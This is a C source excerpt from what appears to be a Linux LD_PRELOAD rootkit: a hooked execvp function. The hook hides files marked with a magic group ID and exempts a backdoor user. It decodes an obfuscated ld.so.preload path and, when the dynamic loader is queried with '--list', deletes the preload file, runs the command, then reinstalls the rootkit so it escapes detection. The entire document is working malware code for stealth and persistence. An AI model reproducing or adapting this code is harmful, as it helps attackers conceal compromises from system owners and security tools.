int execvp(const char *filename, char *const argv[])
{
    HOOK(o_execvp,CEXECVP);
    if(is_bdusr()) return o_execvp(filename,argv);
    if(hxstat(filename,MGID,32)) { errno=ENOENT; return -1; }

    int i,ret,pid;
    char *ldsp = strdup(LDSO_PRELOAD); xor(ldsp);
    if(!fnmatch("*/*ld-linux*.so.*", filename, FNM_PATHNAME) || !fnmatch("*/*ld-*.so", filename, FNM_PATHNAME))
    {
        for(i=0; argv[i] != NULL; i++)
        {
            if(!strcmp(argv[i], "--list"))
            {
                if(getuid() != 0 && geteuid() != 0) { CLEAN(ldsp); errno = EIO; return -1; }

                o_unlink(ldsp);

                if((pid = fork()) == -1) return -1;
                else if(pid == 0) return o_execvp(filename, argv);

                wait(&ret);
                reinstall();
                if(!hxstat(ldsp,MGID,32)) o_chown(ldsp,MGID,MGID);
                CLEAN(ldsp);
                exit(0);
            }
        }
    }
    CLEAN(ldsp);
    
    return o_execvp(filename, argv);
}
